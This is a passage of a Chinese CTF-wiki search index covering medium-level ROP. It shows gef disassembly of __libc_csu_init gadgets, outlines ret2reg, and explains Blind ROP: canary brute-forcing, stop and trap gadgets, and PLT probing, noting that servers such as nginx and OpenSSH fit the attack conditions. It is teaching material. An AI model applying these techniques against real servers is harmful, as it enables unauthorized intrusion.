\u5229\u7528\u5c3e\u90e8\u4ee3\u7801\u63a7\u5236\u4e86rbx\uff0crbp\uff0cr12\uff0cr13\uff0cr14\uff0cr15\u3002  \u5229\u7528\u4e2d\u95f4\u90e8\u5206\u7684\u4ee3\u7801\u63a7\u5236\u4e86rdx\uff0crsi\uff0cedi\u3002   \u800c\u5176\u5b9elibc_csu_init\u7684\u5c3e\u90e8\u901a\u8fc7\u504f\u79fb\u662f\u53ef\u4ee5\u63a7\u5236\u5176\u4ed6\u5bc4\u5b58\u5668\u7684\u3002\u5176\u4e2d\uff0c0x000000000040061A\u662f\u6b63\u5e38\u7684\u8d77\u59cb\u5730\u5740\uff0c \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u57280x000000000040061f\u5904\u53ef\u4ee5\u63a7\u5236rbp\u5bc4\u5b58\u5668\uff0c\u57280x0000000000400621\u5904\u53ef\u4ee5\u63a7\u5236rsi\u5bc4\u5b58\u5668\u3002 \u800c\u5982\u679c\u60f3\u8981\u6df1\u5165\u5730\u4e86\u89e3\u8fd9\u4e00\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u5c31\u8981\u5bf9\u6c47\u7f16\u6307\u4ee4\u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bb5\u8fdb\u884c\u66f4\u52a0\u900f\u5f7b\u5730\u7406\u89e3\u3002\u5982\u4e0b\u3002  gef \u27a4    x / 5 i   0x000000000040061A \n    0 x40061a   __libc_csu_init + 90 :     pop      rbx \n    0 x40061b   __libc_csu_init + 91 :     pop      rbp \n    0 x40061c   __libc_csu_init + 92 :     pop      r12 \n    0 x40061e   __libc_csu_init + 94 :     pop      r13 \n    0 x400620   __libc_csu_init + 96 :     pop      r14  gef \u27a4    x / 5 i   0x000000000040061b \n    0 x40061b   __libc_csu_init + 91 :     pop      rbp \n    0 x40061c   __libc_csu_init + 92 :     pop      r12 \n    0 x40061e   __libc_csu_init + 94 :     pop      r13 \n    0 x400620   __libc_csu_init + 96 :     pop      r14 \n    0 x400622   __libc_csu_init + 98 :     pop      r15  gef \u27a4    x / 5 i   0x000000000040061A + 3 \n    0 x40061d   __libc_csu_init + 93 :     pop      rsp \n    0 x40061e   __libc_csu_init + 94 :     pop      r13 \n    0 x400620   __libc_csu_init + 96 :     pop      r14 \n    0 x400622   __libc_csu_init + 98 :     pop      r15 \n    0 x400624   __libc_csu_init + 100 :    ret   gef \u27a4    x / 5 i   0x000000000040061e \n    0 x40061e   __libc_csu_init + 94 :     pop      r13 \n    0 x400620   __libc_csu_init + 96 :     pop      r14 \n    0 x400622   __libc_csu_init + 98 :     pop      r15 \n    0 x400624   __libc_csu_init + 100 :    ret     \n    0x400625 :      nop  gef \u27a4    x / 5 i   0x000000000040061f \n    0 x40061f   __libc_csu_init + 95 :     pop      rbp \n    0 x400620   __libc_csu_init + 96 :     pop      r14 \n    0 x400622   __libc_csu_init + 98 :     pop      r15 \n    0 x400624   __libc_csu_init + 100 :    ret     \n    0x400625 :      nop  gef \u27a4    x / 5 i   0x0000000000400620 \n    0 x400620   __libc_csu_init + 96 :     pop      r14 \n    0 x400622   __libc_csu_init + 98 :     pop      r15 \n    0 x400624   __libc_csu_init + 100 :    ret     \n    0x400625 :      nop \n    0 x400626:      nop      WORD   PTR   cs :[ rax + rax * 1 + 0x0 ]  gef \u27a4    x / 5 i   0x0000000000400621 \n    0 x400621   __libc_csu_init + 97 :     pop      rsi \n    0 x400622   __libc_csu_init + 98 :     pop      r15 \n    0 x400624   __libc_csu_init + 100 :    ret     \n    0x400625 :      nop  gef \u27a4    x / 5 i   0x000000000040061A + 9 \n    0 x400623   __libc_csu_init + 99 :     pop      rdi \n    0 x400624   __libc_csu_init + 100 :    ret     \n    0x400625 :      nop \n    0 x400626:      nop      WORD   PTR   cs :[ rax + rax * 1 + 0x0 ] \n    0 x400630   __libc_csu_fini :    repz   ret", 
            "title": "gadget"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_5", 
            "text": "2016 XDCTF pwn100  2016 \u534e\u5c71\u676f SU_PWN   \u53c2\u8003\u9605\u8bfb   http://wooyun.jozxing.cc/static/drops/papers-7551.html  http://wooyun.jozxing.cc/static/drops/binary-10638.html", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#ret2reg", 
            "text": "", 
            "title": "ret2reg"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_6", 
            "text": "\u67e5\u770b\u6ea2\u51fa\u51fd\u8fd4\u56de\u65f6\u54ea\u4e2a\u5bc4\u5b58\u503c\u6307\u5411\u6ea2\u51fa\u7f13\u51b2\u533a\u7a7a\u95f4  \u7136\u540e\u53cd\u7f16\u8bd1\u4e8c\u8fdb\u5236\uff0c\u67e5\u627ecall reg \u6216\u8005jmp reg\u6307\u4ee4\uff0c\u5c06 EIP\u8bbe\u7f6e\u4e3a\u8be5\u6307\u4ee4\u5730\u5740  reg\u6240\u6307\u5411\u7684\u7a7a\u95f4\u4e0a\u6ce8\u5165Shellcode(\u9700\u8981\u786e\u4fdd\u8be5\u7a7a\u95f4\u662f\u53ef\u4ee5\u6267\u884c\u7684\uff0c\u4f46\u901a\u5e38\u90fd\u662f\u6808\u4e0a\u7684)", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#brop", 
            "text": "", 
            "title": "BROP"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_7", 
            "text": "BROP(Blind ROP)\u4e8e2014\u5e74\u7531Standford\u7684Andrea Bittau\u63d0\u51fa\uff0c\u5176\u76f8\u5173\u7814\u7a76\u6210\u679c\u53d1\u8868\u5728Oakland 2014\uff0c\u5176\u8bba\u6587\u9898\u76ee\u662f Hacking Blind \uff0c\u4e0b\u9762\u662f\u4f5c\u8005\u5bf9\u5e94\u7684paper\u548cslides,\u4ee5\u53ca\u4f5c\u8005\u76f8\u5e94\u7684\u4ecb\u7ecd   paper  slide   BROP\u662f\u6ca1\u6709\u5bf9\u5e94\u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u6216\u8005\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e0b\uff0c\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u653b\u51fb\uff0c\u52ab\u6301\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002", 
            "title": "\u57fa\u672c\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_8", 
            "text": "\u6e90\u7a0b\u5e8f\u5fc5\u987b\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4ee5\u4fbf\u4e8e\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002  \u670d\u52a1\u5668\u7aef\u7684\u8fdb\u7a0b\u5728\u5d29\u6e83\u4e4b\u540e\u4f1a\u91cd\u65b0\u542f\u52a8\uff0c\u5e76\u4e14\u91cd\u65b0\u542f\u52a8\u7684\u8fdb\u7a0b\u7684\u5730\u5740\u4e0e\u5148\u524d\u7684\u5730\u5740\u4e00\u6837\uff08\u8fd9\u4e5f\u5c31\u662f\u8bf4\u5373\u4f7f\u7a0b\u5e8f\u6709ASLR\u4fdd\u62a4\uff0c\u4f46\u662f\u5176\u53ea\u662f\u5728\u7a0b\u5e8f\u6700\u521d\u542f\u52a8\u7684\u65f6\u5019\u6709\u6548\u679c\uff09\u3002\u76ee\u524dnginx, MySQL, Apache, OpenSSH\u7b49\u670d\u52a1\u5668\u5e94\u7528\u90fd\u662f\u7b26\u5408\u8fd9\u79cd\u7279\u6027\u7684\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_9", 
            "text": "\u76ee\u524d\uff0c\u5927\u90e8\u5206\u5e94\u7528\u90fd\u4f1a\u5f00\u542fASLR\u3001NX\u3001Canary\u4fdd\u62a4\u3002\u8fd9\u91cc\u6211\u4eec\u5206\u522b\u8bb2\u89e3\u5728BROP\u4e2d\u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e9b\u4fdd\u62a4\uff0c\u4ee5\u53ca\u5982\u4f55\u8fdb\u884c\u653b\u51fb\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_10", 
            "text": "\u5728BROP\u4e2d\uff0c\u57fa\u672c\u7684\u9075\u5faa\u7684\u601d\u8def\u5982\u4e0b   \u5224\u65ad\u6808\u6ea2\u51fa\u957f\u5ea6  \u66b4\u529b\u679a\u4e3e    Stack Reading  \u83b7\u53d6\u6808\u4e0a\u7684\u6570\u636e\u6765\u6cc4\u9732canaries\uff0c\u4ee5\u53caebp\u548c\u8fd4\u56de\u5730\u5740\u3002    Bind ROP  \u627e\u5230\u8db3\u591f\u591a\u7684 gadgets \u6765\u63a7\u5236\u8f93\u51fa\u51fd\u6570\u7684\u53c2\u6570\uff0c\u5e76\u4e14\u5bf9\u5176\u8fdb\u884c\u8c03\u7528\uff0c\u6bd4\u5982\u8bf4\u5e38\u89c1\u7684 write \u51fd\u6570\u4ee5\u53caputs\u51fd\u6570\u3002    Build the exploit  \u5229\u7528\u8f93\u51fa\u51fd\u6570\u6765 dump \u51fa\u7a0b\u5e8f\u4ee5\u4fbf\u4e8e\u6765\u627e\u5230\u66f4\u591a\u7684 gadgets\uff0c\u4ece\u800c\u53ef\u4ee5\u5199\u51fa\u6700\u540e\u7684 exploit\u3002", 
            "title": "\u57fa\u672c\u601d\u8def"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_11", 
            "text": "\u76f4\u63a5\u4ece1\u66b4\u529b\u679a\u4e3e\u5373\u53ef\uff0c\u76f4\u5230\u53d1\u73b0\u7a0b\u5e8f\u5d29\u6e83\u3002", 
            "title": "\u6808\u6ea2\u51fa\u957f\u5ea6"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#stack-reading", 
            "text": "\u5982\u4e0b\u6240\u793a\uff0c\u8fd9\u662f\u76ee\u524d\u7ecf\u5178\u7684\u6808\u5e03\u5c40  buffer|canary|saved fame pointer|saved returned address  \u8981\u5411\u5f97\u5230canary\u4ee5\u53ca\u4e4b\u540e\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u4f55\u5f97\u5230overflow\u7684\u957f\u5ea6\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u4e0d\u65ad\u5c1d\u8bd5\u6765\u83b7\u53d6\u3002  \u5176\u6b21\uff0c\u5173\u4e8ecanary\u4ee5\u53ca\u540e\u9762\u7684\u53d8\u91cf\uff0c\u6240\u91c7\u7528\u7684\u7684\u65b9\u6cd5\u4e00\u81f4\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5canary\u4e3a\u4f8b\u3002  canary\u672c\u8eab\u53ef\u4ee5\u901a\u8fc7\u7206\u7834\u6765\u83b7\u53d6\uff0c\u4f46\u662f\u5982\u679c\u53ea\u662f\u611a\u8822\u5730\u679a\u4e3e\u6240\u6709\u7684\u6570\u503c\u7684\u8bdd\uff0c\u663e\u7136\u662f\u4f4e\u6548\u7684\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u6761\u4ef62\u8868\u660e\u4e86\u7a0b\u5e8f\u672c\u8eab\u5e76\u4e0d\u4f1a\u56e0\u4e3acrash\u6709\u53d8\u5316\uff0c\u6240\u4ee5\u6bcf\u6b21\u7684canary\u7b49\u503c\u90fd\u662f\u4e00\u6837\u7684\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5b57\u8282\u8fdb\u884c\u7206\u7834\u3002\u6b63\u5982\u8bba\u6587\u4e2d\u6240\u5c55\u793a\u7684\uff0c\u6bcf\u4e2a\u5b57\u8282\u6700\u591a\u6709256\u79cd\u53ef\u80fd\uff0c\u6240\u4ee5\u572832\u4f4d\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6700\u591a\u9700\u8981\u7206\u78341024\u6b21\uff0c64\u4f4d\u6700\u591a\u7206\u78342048\u6b21\u3002", 
            "title": "Stack Reading"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#blind-rop", 
            "text": "", 
            "title": "Blind ROP"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_12", 
            "text": "\u6700\u6734\u7d20\u7684\u6267\u884cwrite\u51fd\u6570\u7684\u65b9\u6cd5\u5c31\u662f\u6784\u9020\u7cfb\u7edf\u8c03\u7528\u3002  pop   rdi ; ret # socket  pop   rsi ; ret # buffer  pop   rdx ; ret # length  pop   rax ; ret # write syscall number  syscall   \u4f46\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u6837\u7684\u65b9\u6cd5\u90fd\u662f\u6bd4\u8f83\u56f0\u96be\u7684\uff0c\u56e0\u4e3a\u60f3\u8981\u627e\u5230\u4e00\u4e2asyscall\u7684\u5730\u5740\u57fa\u672c\u4e0d\u53ef\u80fd\u3002\u3002\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8f6c\u6362\u4e3a\u627ewrite\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u3002", 
            "title": "\u57fa\u672c\u601d\u8def"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#brop-gadgets", 
            "text": "\u9996\u5148\uff0c\u5728libc_csu_init\u7684\u7ed3\u5c3e\u4e00\u957f\u4e32\u7684gadgets\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u504f\u79fb\u6765\u83b7\u53d6write\u51fd\u6570\u8c03\u7528\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u3002\u6b63\u5982\u6587\u4e2d\u6240\u5c55\u793a\u7684", 
            "title": "BROP gadgets"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#find-a-call-write", 
            "text": "\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7plt\u8868\u6765\u83b7\u53d6write\u7684\u5730\u5740\u3002", 
            "title": "find a call write"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#control-rdx", 
            "text": "\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0crdx\u53ea\u662f\u6211\u4eec\u7528\u6765\u8f93\u51fa\u7a0b\u5e8f\u5b57\u8282\u957f\u5ea6\u7684\u53d8\u91cf\uff0c\u53ea\u8981\u4e0d\u4e3a0\u5373\u53ef\u3002\u4e00\u822c\u6765\u8bf4\u7a0b\u5e8f\u4e2d\u7684rdx\u7ecf\u5e38\u6027\u4f1a\u4e0d\u662f\u96f6\u3002\u4f46\u662f\u4e3a\u4e86\u66f4\u597d\u5730\u63a7\u5236\u7a0b\u5e8f\u8f93\u51fa\uff0c\u6211\u4eec\u4ecd\u7136\u5c3d\u91cf\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e2a\u503c\u3002\u4f46\u662f\uff0c\u5728\u7a0b\u5e8f  pop   rdx ; ret   \u8fd9\u6837\u7684\u6307\u4ee4\u51e0\u4e4e\u6ca1\u6709\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u63a7\u5236rdx\u7684\u6570\u503c\u5462\uff1f\u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u6267\u884cstrcmp\u7684\u65f6\u5019\uff0crdx\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u5c06\u8981\u88ab\u6bd4\u8f83\u7684\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u627e\u5230strcmp\u51fd\u6570\uff0c\u4ece\u800c\u6765\u63a7\u5236rdx\u3002  \u90a3\u4e48\u63a5\u4e0b\u6765\u7684\u95ee\u9898\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5206\u4e3a\u4e24\u9879   \u5bfb\u627egadgets  \u5bfb\u627ePLT\u8868  write\u5165\u53e3  strcmp\u5165\u53e3", 
            "title": "control rdx"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#gadgets", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u6765\u60f3\u529e\u6cd5\u5bfb\u627egadgets\u3002\u6b64\u65f6\uff0c\u7531\u4e8e\u5c1a\u672a\u77e5\u9053\u7a0b\u5e8f\u5177\u4f53\u957f\u4ec0\u4e48\u6837\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u901a\u8fc7\u7b80\u5355\u7684\u63a7\u5236\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u81ea\u5df1\u8bbe\u7f6e\u7684\u503c\uff0c\u4ece\u800c\u800c\u6765\u731c\u6d4b\u76f8\u5e94\u7684gadgets\u3002\u800c\u5f53\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u65f6\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5   \u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83  \u7a0b\u5e8f\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u540e\u5d29\u6e83  \u7a0b\u5e8f\u4e00\u76f4\u8fd0\u884c\u800c\u5e76\u4e0d\u5d29\u6e83   \u4e3a\u4e86\u5bfb\u627e\u5408\u7406\u7684gadgets\uff0c\u6211\u4eec\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e24\u6b65", 
            "title": "\u5bfb\u627egadgets"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#stop-gadgets", 
            "text": "\u6240\u8c13 stop gadget \u4e00\u822c\u6307\u7684\u662f\u8fd9\u6837\u4e00\u6bb5\u4ee3\u7801\uff1a\u5f53\u7a0b\u5e8f\u7684\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u5165\u65e0\u9650\u5faa\u73af\uff0c\u8fd9\u6837\u4f7f\u5f97\u653b\u51fb\u8005\u80fd\u591f\u4e00\u76f4\u4fdd\u6301\u8fde\u63a5\u72b6\u6001\u3002   \u5176\u5b9estop gadget\u4e5f\u5e76\u4e0d\u4e00\u5b9a\u5f97\u662f\u4e0a\u9762\u7684\u6837\u5b50\uff0c\u5176\u6839\u672c\u7684\u76ee\u7684\u5728\u4e8e\u544a\u8bc9\u653b\u51fb\u8005\uff0c\u6240\u6d4b\u8bd5\u7684\u8fd4\u56de\u5730\u5740\u662f\u4e00\u4e2agadgets\u3002   \u4e4b\u6240\u4ee5\u8981\u5bfb\u627estop gadgets\uff0c\u662f\u56e0\u4e3a\u5f53\u6211\u4eec\u731c\u5230\u67d0\u4e2agadgtes\u540e\uff0c\u5982\u679c\u6211\u4eec\u4ec5\u4ec5\u662f\u5c06\u5176\u5e03\u7f6e\u5728\u6808\u4e0a\uff0c\u7531\u4e8e\u6267\u884c\u5b8c\u8fd9\u4e2agadget\u4e4b\u540e\uff0c\u7a0b\u5e8f\u8fd8\u4f1a\u8df3\u5230\u6808\u4e0a\u7684\u4e0b\u4e00\u4e2a\u5730\u5740\u3002\u5982\u679c\u8be5\u5730\u5740\u662f\u975e\u6cd5\u5730\u5740\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1acrash\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5728\u653b\u51fb\u8005\u770b\u6765\u7a0b\u5e8f\u53ea\u662f\u5355\u7eaf\u7684crash\u4e86\u3002\u56e0\u6b64\uff0c\u653b\u51fb\u8005\u5c31\u4f1a\u8ba4\u4e3a\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5e76\u6ca1\u6709\u6267\u884c\u5230\u4efb\u4f55\u7684 useful gadget \uff0c\u4ece\u800c\u653e\u5f03\u5b83\u3002\u4f8b\u5b50\u5982\u4e0b\u56fe   \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u5e03\u7f6e\u4e86 stop gadget \uff0c\u90a3\u4e48\u5bf9\u4e8e\u6211\u4eec\u6240\u8981\u5c1d\u8bd5\u7684\u6bcf\u4e00\u4e2a\u5730\u5740\uff0c\u5982\u679c\u5b83\u662f\u4e00\u4e2agadget\u7684\u8bdd\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4e0d\u4f1a\u5d29\u6e83\u3002\u63a5\u4e0b\u6765\uff0c\u5c31\u662f\u53bb\u60f3\u529e\u6cd5\u8bc6\u522b\u8fd9\u4e9bgadget\u3002", 
            "title": "\u5bfb\u627estop gadgets"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#gadgets_1", 
            "text": "\u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u8bc6\u522b\u8fd9\u4e9bgadgets\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6808\u5e03\u5c40\u4ee5\u53ca\u7a0b\u5e8f\u7684\u884c\u4e3a\u6765\u8fdb\u884c\u8bc6\u522b\u3002\u4e3a\u4e86\u66f4\u52a0\u5bb9\u6613\u5730\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u5b9a\u4e49\u6808\u4e0a\u7684\u4e09\u79cd\u5730\u5740   Probe  \u63a2\u9488\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u60f3\u8981\u63a2\u6d4b\u7684\u4ee3\u7801\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u90fd\u662f64\u4f4d\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ece0x400000\u5c1d\u8bd5\uff0c\u5982\u679c\u4e0d\u6210\u529f\uff0c\u6709\u53ef\u80fd\u7a0b\u5e8f\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u518d\u4e0d\u6d4e\uff0c\u5c31\u53ef\u80fd\u662f\u7a0b\u5e8f\u662f32\u4f4d\u4e86\u3002\u3002\u8fd9\u91cc\u6211\u8fd8\u6ca1\u6709\u7279\u522b\u60f3\u660e\u767d\uff0c\u600e\u4e48\u53ef\u4ee5\u5feb\u901f\u786e\u5b9a\u8fdc\u7a0b\u7684\u4f4d\u6570\u3002    Stop  \u4e0d\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u7684stop gadget\u7684\u5730\u5740\u3002    Trap  \u53ef\u4ee5\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83\u7684\u5730\u5740     \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728\u6808\u4e0a\u6446\u653e\u4e0d\u540c\u987a\u5e8f\u7684 Stop \u4e0e  Trap \u4ece\u800c\u6765\u8bc6\u522b\u51fa\u6b63\u5728\u6267\u884c\u7684\u6307\u4ee4\u3002\u56e0\u4e3a\u6267\u884cStop\u610f\u5473\u7740\u7a0b\u5e8f\u4e0d\u4f1a\u5d29\u6e83\uff0c\u6267\u884cTrap\u610f\u5473\u7740\u7a0b\u5e8f\u4f1a\u7acb\u5373\u5d29\u6e83\u3002\u8fd9\u91cc\u7ed9\u51fa\u51e0\u4e2a\u4f8b\u5b50   probe,stop,traps(traps,traps,...)  \u6211\u4eec\u901a\u8fc7\u7a0b\u5e8f\u5d29\u6e83\u4e0e\u5426( \u5982\u679c\u7a0b\u5e8f\u5728probe\u5904\u76f4\u63a5\u5d29\u6e83\u600e\u4e48\u5224\u65ad )\u53ef\u4ee5\u627e\u5230\u4e0d\u4f1a\u5bf9\u6808\u8fdb\u884cpop\u64cd\u4f5c\u7684gadget\uff0c\u5982  ret  xor eax,eax; ret      probe,trap,stop,traps  \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u5e03\u5c40\u627e\u5230\u53ea\u662f\u5f39\u51fa\u4e00\u4e2a\u6808\u53d8\u91cf\u7684gadget\u3002\u5982  pop rax; ret  pop rdi; ret      probe, trap, trap, trap, trap, trap, trap, stop, traps  \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u5e03\u5c40\u6765\u627e\u5230\u5f39\u51fa6\u4e2a\u6808\u53d8\u91cf\u7684gadget\uff0c\u4e5f\u5c31\u662f\u4e0ebrop gadget\u76f8\u4f3c\u7684gadget\u3002 \u8fd9\u91cc\u611f\u89c9\u539f\u6587\u662f\u6709\u95ee\u9898\u7684\uff0c\u6bd4\u5982\u8bf4\u5982\u679c\u9047\u5230\u4e86\u53ea\u662fpop\u4e00\u4e2a\u6808\u53d8\u91cf\u7684\u5730\u5740\uff0c\u5176\u5b9e\u4e5f\u662f\u4e0d\u4f1a\u5d29\u6e83\u7684\uff0c\uff0c \u8fd9\u91cc\u4e00\u822c\u6765\u8bf4\u4f1a\u9047\u5230\u4e24\u5904\u6bd4\u8f83\u6709\u610f\u601d\u7684\u5730\u65b9  plt\u5904\u4e0d\u4f1a\u5d29\uff0c\uff0c  _start\u5904\u4e0d\u4f1a\u5d29\uff0c\u76f8\u5f53\u4e8e\u7a0b\u5e8f\u91cd\u65b0\u6267\u884c\u3002       \u4e4b\u6240\u4ee5\u8981\u5728\u6bcf\u4e2a\u5e03\u5c40\u7684\u540e\u9762\u90fd\u653e\u4e0atrap\uff0c\u662f\u4e3a\u4e86\u80fd\u591f\u8bc6\u522b\u51fa\uff0c\u5f53\u6211\u4eec\u7684probe\u5904\u5bf9\u5e94\u7684\u5730\u5740\u6267\u884c\u7684\u6307\u4ee4\u8df3\u8fc7\u4e86stop\uff0c\u7a0b\u5e8f\u7acb\u9a6c\u5d29\u6e83\u7684\u884c\u4e3a\u3002  \u4f46\u662f\uff0c\u5373\u4f7f\u662f\u8fd9\u6837\uff0c\u6211\u4eec\u4ecd\u7136\u96be\u4ee5\u8bc6\u522b\u51fa\u6b63\u5728\u6267\u884c\u7684gadget\u5230\u5e95\u662f\u5728\u5bf9\u54ea\u4e2a\u5bc4\u5b58\u5668\u8fdb\u884c\u64cd\u4f5c\u3002  \u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u5411BROP\u8fd9\u6837\u7684\u4e00\u4e0b\u5b50\u5f39\u51fa6\u4e2a\u5bc4\u5b58\u5668\u7684gadgets\uff0c\u7a0b\u5e8f\u4e2d\u5e76\u4e0d\u7ecf\u5e38\u51fa\u73b0\u3002\u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u53d1\u73b0\u4e86\u8fd9\u6837\u7684gadgets\uff0c\u90a3\u4e48\uff0c\u6709\u5f88\u5927\u7684\u53ef\u80fd\u6027\uff0c\u8fd9\u4e2agadgets\u5c31\u662fbrop gadgets\u3002\u6b64\u5916\uff0c\u8fd9\u4e2agadgets\u901a\u8fc7\u9519\u4f4d\u8fd8\u53ef\u4ee5\u751f\u6210pop rsp\u7b49\u8fd9\u6837\u7684gadgets\uff0c\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u8bc6\u522b\u8fd9\u4e2agadgets\u7684\u6807\u5fd7\u3002  \u6b64\u5916\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5b66\u7684ret2libc_csu_init\u53ef\u4ee5\u77e5\u9053\u8be5\u5730\u5740\u51cf\u53bb0x1a\u5c31\u4f1a\u5f97\u5230\u5176\u4e0a\u4e00\u4e2agadgets\u3002\u53ef\u4ee5\u4f9b\u6211\u4eec\u8c03\u7528\u5176\u5b83\u51fd\u6570\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662fprobe\u53ef\u80fd\u662f\u4e00\u4e2astop gadget\uff0c\u6211\u4eec\u5f97\u53bb\u68c0\u67e5\u4e00\u4e0b\uff0c\u600e\u4e48\u68c0\u67e5\u5462\uff1f\u6211\u4eec\u53ea\u9700\u8981\u8ba9\u540e\u9762\u6240\u6709\u7684\u5185\u5bb9\u53d8\u4e3atrap\u5730\u5740\u5373\u53ef\u3002\u56e0\u4e3a\u5982\u679c\u662fstop gadget\u7684\u8bdd\uff0c\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u5c31\u4f1a\u5d29\u6e83\u3002\u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6709\u610f\u601d.", 
            "title": "\u8bc6\u522b gadgets"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#plt", 
            "text": "\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u7a0b\u5e8f\u7684plt\u8868\u5177\u6709\u6bd4\u8f83\u89c4\u6574\u7684\u7ed3\u6784\uff0c\u6bcf\u4e00\u4e2aplt\u8868\u9879\u90fd\u662f16\u5b57\u8282\u3002\u800c\u4e14\uff0c\u5728\u6bcf\u4e00\u4e2a\u8868\u9879\u76846\u5b57\u8282\u504f\u79fb\u5904\uff0c\u662f\u8be5\u8868\u9879\u5bf9\u5e94\u7684\u51fd\u6570\u7684\u89e3\u6790\u8def\u5f84\uff0c\u5373\u7a0b\u5e8f\u6700\u521d\u6267\u884c\u8be5\u51fd\u6570\u7684\u65f6\u5019\uff0c\u4f1a\u6267\u884c\u8be5\u8def\u5f84\u5bf9\u51fd\u6570\u7684got\u5730\u5740\u8fdb\u884c\u89e3\u6790\u3002    